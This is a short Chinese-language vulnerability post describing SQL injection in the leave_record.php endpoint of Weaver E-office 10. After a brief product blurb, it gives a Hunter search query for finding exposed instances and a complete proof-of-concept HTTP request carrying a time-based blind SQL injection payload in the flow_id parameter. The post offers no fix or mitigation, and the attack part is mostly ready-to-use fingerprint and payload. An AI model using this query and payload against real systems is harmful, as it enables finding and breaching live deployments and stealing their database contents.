# 泛微E-office-10接口leave_record.php存在SQL注入漏洞

泛微eoffice10协同办公平台是一款专业的office办公的工具软件。软件支持在线多人编辑文件，并且会在第一时间收发协作需求。十分方便快捷，界面简约，布局直观清晰，操作简单，极易上手，是一款不可多得的利器。泛微E-office 10 leave_record存在SQL注入漏洞，攻击者可通过该漏洞获取数据库敏感信息甚至getshell。

## hunter

```yaml
web.body="eoffice10"&&web.body="eoffice_loading_tip"
```

## poc

```yaml
GET /eoffice10/server/ext/system_support/leave_record.php?flow_id=1%27+AND+%28SELECT+4196+FROM+%28SELECT%28SLEEP%285%29%29%29LWzs%29+AND+%27zfNf%27%3D%27zfNf&run_id=1&table_field=1&table_field_name=user()&max_rows=10 HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:122.0) Gecko/20100101 Firefox/122.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
```

![img](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407171255148.png)